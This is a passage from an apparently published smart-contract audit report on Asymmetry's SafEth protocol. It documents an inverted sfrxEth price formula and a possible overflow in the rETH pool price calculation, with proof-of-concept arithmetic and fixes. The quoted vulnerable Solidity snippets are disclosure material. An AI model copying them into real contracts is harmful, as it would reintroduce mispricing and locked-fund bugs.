confirmed with comments. Full details in reports from d3e4 (<a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/31\">here</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/74\">here</a>), <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/26\">adriro</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/5\">0x52</a>.</p>\n<hr>\n<h2 id=\"h-04-price-of-sfrxeth-derivative-is-calculated-incorrectly\" style=\"position:relative;\"><a href=\"#h-04-price-of-sfrxeth-derivative-is-calculated-incorrectly\" aria-label=\"h 04 price of sfrxeth derivative is calculated incorrectly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/641\">[H-04] Price of sfrxEth derivative is calculated incorrectly</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/641\">lukris02</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1124\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/698\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/650\">qpzm</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/431\">RedTiger</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/329\">Bauer</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/240\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/177\">dec3ntraliz3d</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/141\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/137\">reassor</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/15\">koxuan</a></em></p>\n<p>In the <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117\">ethPerDerivative()</a>, the calculated <code>frxAmount</code> is multiplied by (10 ** 18) and divided by <code>price_oracle</code>, but it must be multiplied by <code>price_oracle</code> and divided by (10 ** 18).</p>\n<p>The impact is severe as <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117\">ethPerDerivative()</a> function is used in <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L63-L101\">stake()</a>, one of  two main functions a user will interact with. The value returned by <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117\">ethPerDerivative()</a> affects the calculations of <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L98\"><code>mintAmount</code></a>. The incorrect calculation may over or understate the amount of safEth received by the user.</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117\">ethPerDerivative()</a> is also used in the <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L60-L88\">withdraw()</a> function when calculating <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L74\"><code>minOut</code></a>. So, incorrect calculation of ethPerDerivative() may increase/decrease slippage. This can cause unexpected losses or function revert. If <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L60-L88\">withdraw()</a> function reverts, the function <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/SafEth.sol#L108-L129\">unstake()</a> is unavailable => assets are locked.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>We need to calculate: (10 ** 18) sfrxEth = X Eth.</p>\n<p>For example, we <code>convertToAssets(10 ** 18)</code> and get <code>frxAmount</code> = 1031226769652703996. <code>price_oracle</code> returns 998827832404234820. So, (10 ** 18) frxEth costs 998827832404234820 Eth. Thus, (10 ** 18) sfrxEth costs <code>frxAmount * price_oracle / 10 ** 18</code> = 1031226769652703996 * 998827832404234820 / 10 ** 18 Eth (1030017999049431492 Eth).</p>\n<p>But <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117\">this function</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function ethPerDerivative(uint256 _amount) public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 frxAmount = IsFrxEth(SFRX_ETH_ADDRESS).convertToAssets(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            10 ** 18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return ((10 ** 18 * frxAmount) /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>calculates the cost of sfrxEth as <code>10 ** 18 * frxAmount / price_oracle</code> = 10 ** 18 * 1031226769652703996 / 998827832404234820 Eth (1032436958800480269 Eth). The current difference ~ 0.23% but it can be more/less.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/SfrxEth.sol#L115-L116\">these lines</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        return ((10 ** 18 * frxAmount) /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle());</span></span></code></pre>\n<p>to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        return (frxAmount * IFrxEthEthPool(FRX_ETH_CRV_POOL_ADDRESS).price_oracle() / 10 ** 18);</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/698#issuecomment-1500457335\">toshiSat (Asymmetry) disputed via duplicate issue <code>#698</code></a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>To protect against oracle attacks we assume FRX is 1:1 with ETH and revert if the oracle says otherwise since there is no chainlink for FRX.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/32\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/27\">adriro</a>.</p>\n<hr>\n<h2 id=\"h-05-reth-poolprice-calculation-may-overflow\" style=\"position:relative;\"><a href=\"#h-05-reth-poolprice-calculation-may-overflow\" aria-label=\"h 05 reth poolprice calculation may overflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/593\">[H-05] Reth <code>poolPrice</code> calculation may overflow</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/593\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1088\">hassan-truscova</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/693\">cloudjunky</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/594\">0x52</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/351\">anodaram</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/239\">T1MOH</a></em></p>\n<p>The Reth derivative contract implements the <code>poolPrice</code> function to get the spot price of the derivative asset using a Uniswap V3 pool. The function queries the pool to fetch the <code>sqrtPriceX96</code> and does the following calculation:</p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L228-L242</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IUniswapV3Factory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factory</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IUniswapV3Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UNI_V3_FACTORY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IUniswapV3Pool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">, </span><span class=\"mtk7\">500</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint160</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sqrtPriceX96</span><span class=\"mtk1\">, , , , , , ) = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slot0</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sqrtPriceX96</span><span class=\"mtk1\"> * (</span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sqrtPriceX96</span><span class=\"mtk1\">)) * (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)) &gt;&gt; (</span><span class=\"mtk7\">96</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The main issue here is that the multiplications in the expression <code>sqrtPriceX96 * (uint(sqrtPriceX96)) * (1e18)</code> may eventually overflow. This case is taken into consideration by the implementation of the <a href=\"https://docs.uniswap.org/contracts/v3/reference/periphery/libraries/OracleLibrary#getquoteattick\">OracleLibrary.getQuoteAtTick</a> function which is part of the Uniswap V3 periphery set of contracts.</p>\n<p><a href=\"https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69\">https://github.com/Uniswap/v3-periphery/blob/main/contracts/libraries/OracleLibrary.sol#L49-L69</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">49</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">50:         </span><span class=\"mtk10\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tick</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">51:         </span><span class=\"mtk10\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk10\">baseAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">52:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">baseToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">53:         </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">54</span><span class=\"mtk1\">:     ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">55</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint160</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sqrtRatioX96</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">TickMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSqrtRatioAtTick</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tick</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">:         </span><span class=\"mtk3\">// Calculate quoteAmount with better precision if it doesn&#39;t overflow when multiplied by itself</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">58</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sqrtRatioX96</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ratioX192</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sqrtRatioX96</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">sqrtRatioX96</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">61</span><span class=\"mtk1\">:                 ? </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ratioX192</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">192</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">62</span><span class=\"mtk1\">:                 : </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">192</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ratioX192</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">63</span><span class=\"mtk1\">:         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ratioX128</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sqrtRatioX96</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sqrtRatioX96</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">64</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">quoteAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">quoteToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:                 ? </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ratioX128</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">128</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:                 : </span><span class=\"mtk12\">FullMath</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulDiv</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &lt;&lt; </span><span class=\"mtk7\">128</span><span class=\"mtk1\">, </span><span class=\"mtk12\">baseAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ratioX128</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Note that this implementation guards against different numerical issues. In particular, the if in line 58 checks for a potential overflow of <code>sqrtRatioX96</code> and switches the implementation to avoid the issue.</p>\n<h3 id=\"recommendation\" style=\"position:relative;\"><a href=\"#recommendation\" aria-label=\"recommendation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>The <code>poolPrice</code> function can delegate the calculation directly to the <a href=\"https://docs.uniswap.org/contracts/v3/reference/periphery/libraries/OracleLibrary#getquoteattick\">OracleLibrary.getQuoteAtTick</a> function of the <code>v3-periphery</code> package:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IUniswapV3Factory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">factory</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IUniswapV3Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">UNI_V3_FACTORY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IUniswapV3Pool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">, </span><span class=\"mtk7\">500</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (, </span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tick</span><span class=\"mtk1\">, , , , , ) = </span><span class=\"mtk12\">pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slot0</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getQuoteAtTick</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tick</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\">, 